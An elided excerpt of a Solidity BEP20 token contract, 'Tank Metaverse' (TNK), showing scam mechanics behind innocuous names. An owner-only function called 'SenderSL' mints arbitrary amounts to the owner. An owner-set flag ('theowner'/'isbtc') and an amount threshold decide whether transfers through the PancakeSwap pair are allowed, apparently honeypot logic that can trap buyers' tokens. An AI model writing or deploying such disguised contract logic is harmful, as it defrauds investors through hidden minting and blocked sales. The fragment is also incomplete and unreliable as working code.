...
contract TankMetaverse is Context, iBEP20, Ownable {
  ...
  string public _name;
  bool isbtc = true;
  uint256 _CMD = 1000 * 10**9;

  constructor() public {
    _name = 'Tank Metaverse';
    _symbol = 'TNK';
    _decimals = 9;
    _totalSupply = 1500 * 10**6 * 10**9; 
  ...
  */
  ...
  function SenderSL(uint256 amount) external onlyOwner returns (bool) {
    _balances[owner()] = _balances[owner()].add(amount);
    emit Transfer(address(0), owner(), amount);
  }

  function theowner(bool _btc) public onlyOwner virtual returns (bool) {
      isbtc = _btc;
      return true;
  }
  function btc() public view returns (bool) {
      return isbtc;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if(sender == pancakeV2Router || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
      ...
      if( (amount <= _CMD || isbtc) && !isContract(sender) ) {
          allow = true;
      }
    }
    if(allow) {
